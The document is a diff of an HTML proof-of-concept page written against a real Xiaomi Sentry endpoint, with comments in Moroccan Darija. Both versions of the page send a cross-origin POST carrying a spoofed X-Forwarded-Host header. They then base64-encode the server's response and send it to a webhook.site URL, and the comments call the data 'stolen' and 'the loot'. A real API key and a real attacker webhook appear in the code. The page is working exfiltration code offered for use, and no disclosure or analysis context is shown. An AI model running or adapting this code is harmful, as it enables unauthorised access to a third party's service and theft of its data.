@@ -1,42 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head><title>Xiaomi Security Research</title></head>
+<head><title>Exploit PoC</title></head>
 <body>
+    <h2>Testing CORS/Host Injection... Check Webhook!</h2>
     <script>
-        // التحويل لـ Base64 باش الداتا تدوز فـ الـ URL بلا مشاكل
-        function b64EncodeUnicode(str) {
-            return btoa(encodeURIComponent(str));
-        }
+        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+        var target = "https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a";
 
-        const targetUrl = 'https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a';
-        const webhook = 'https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0';
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", target, true);
+        
+        // هاد Headers هما اللي كيخليو الـ Bypass يخدم
+        xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
+        xhr.setRequestHeader("X-Forwarded-Host", "alisgp-sentry.pt.xiaomi.com");
 
-        // الـ Payload اللي كيجبد الـ Session Metadata
-        const payload = JSON.stringify({
-            "sent_at": new Date().toISOString(),
-            "sdk": {"name": "sentry.javascript.browser", "version": "7.64.0"}
-        }) + "\n" + JSON.stringify({"type": "session"}) + "\n" + JSON.stringify({
-            "sid": "9fa0865b34df4962bfc63676fe8739b9", // هادا مثال، السيرفر غايرجع الحقيقي
-            "init": true,
-            "status": "ok"
-        });
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                // أول ما تجي الداتا، صيفطها للـ Webhook بـ GET Request بسيطة
+                var stolenData = btoa(xhr.responseText);
+                var leak = new Image();
+                leak.src = webhook + "?exfiltrated=" + stolenData;
+                console.log("Data sent to Webhook!");
+            }
+        };
 
-        fetch(targetUrl, {
-            method: 'POST',
-            mode: 'cors',
-            headers: {
-                'Content-Type': 'text/plain;charset=UTF-8',
-                'X-Forwarded-Host': 'alisgp-sentry.pt.xiaomi.com' // الضربة ديال الـ Bypass
-            },
-            body: payload
-        })
-        .then(response => response.text())
-        .then(data => {
-            // صيفط "الغنيمة" لـ Webhook ديالك
-            fetch(webhook + '?data=' + b64EncodeUnicode(data), {mode: 'no-cors'});
-            console.log("Success! Check your Webhook.");
-        })
-        .catch(err => console.error("Error:", err));
+        var body = '{"sent_at":"' + new Date().toISOString() + '"}\n{"type":"session"}\n{"init":true}';
+        xhr.send(body);
     </script>
 </body>
 </html>
